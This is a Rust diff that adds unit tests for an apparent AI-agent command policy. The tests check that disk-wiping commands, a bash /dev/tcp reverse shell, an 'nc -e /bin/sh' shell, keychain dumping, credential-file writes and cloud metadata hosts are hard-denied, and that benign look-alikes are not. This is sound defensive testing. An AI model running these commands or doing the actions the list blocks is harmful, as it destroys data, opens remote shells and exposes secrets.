@@ -441,6 +441,36 @@ mod tests {
         assert!(hard_deny_match(&policy, &command_action(&["ls", "-la"])).is_none());
     }
 
+    #[test]
+    fn hard_deny_extended_destructive_commands() {
+        let policy = builtin();
+        for argv in [
+            ["dd", "if=/dev/zero", "of=/dev/sda"].as_slice(),
+            ["mkfs.ext4", "/dev/sdb"].as_slice(),
+            ["bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"].as_slice(),
+            ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"].as_slice(),
+            ["history", "-c"].as_slice(),
+            ["security", "dump-keychain"].as_slice(),
+            ["csrutil", "disable"].as_slice(),
+            ["fida", "uninstall"].as_slice(),
+        ] {
+            assert!(
+                hard_deny_match(&policy, &command_action(argv)).is_some(),
+                "expected hard deny for {argv:?}"
+            );
+        }
+        // Benign look-alikes must NOT be denied (precision over recall).
+        for argv in [
+            ["dd", "if=a.img", "of=b.img"].as_slice(),
+            ["git", "commit", "-c", "msg"].as_slice(),
+        ] {
+            assert!(
+                hard_deny_match(&policy, &command_action(argv)).is_none(),
+                "false positive for {argv:?}"
+            );
+        }
+    }
+
     // ----- hard_deny_match: files -----------------------------------------
 
     #[test]
@@ -481,6 +511,31 @@ mod tests {
         );
     }
 
+    #[test]
+    fn hard_deny_extended_sensitive_writes() {
+        let policy = builtin();
+        for path in [
+            "home/.aws/credentials",
+            "project/.ssh/authorized_keys",
+            "config/prod.env",
+            "home/.gnupg/secring.gpg",
+            "home/.netrc",
+            "home/.bashrc",
+            "fida.yaml",
+            "home/Library/Keychains/login.keychain-db",
+        ] {
+            assert!(
+                hard_deny_match(&policy, &file_action(ActionKind::FileWrite, path)).is_some(),
+                "expected write hard deny for `{path}`"
+            );
+            // Reads of the same paths still reach the mediated redaction path.
+            assert!(
+                hard_deny_match(&policy, &file_action(ActionKind::FileRead, path)).is_none(),
+                "read of `{path}` should not be hard-denied"
+            );
+        }
+    }
+
     // ----- hard_deny_match: network ---------------------------------------
 
     #[test]
@@ -507,5 +562,24 @@ mod tests {
         assert!(
             hard_deny_match(&policy, &network_action(Some("github.com"), "140.82.112.3")).is_none()
         );
+    }
+
+    #[test]
+    fn hard_deny_extended_network_targets() {
+        let policy = builtin();
+        // Extra metadata hosts + new internal ranges (SSRF surface).
+        for host in [
+            "metadata.google.internal",
+            "100.100.100.200",
+            "100.64.0.1", // carrier-grade NAT
+            "169.254.169.254",
+        ] {
+            assert!(
+                hard_deny_match(&policy, &network_action(None, host)).is_some(),
+                "expected hard deny for `{host}`"
+            );
+        }
+        // Loopback stays allowed so local dev servers remain reachable.
+        assert!(hard_deny_match(&policy, &network_action(None, "127.0.0.1")).is_none());
     }
 }
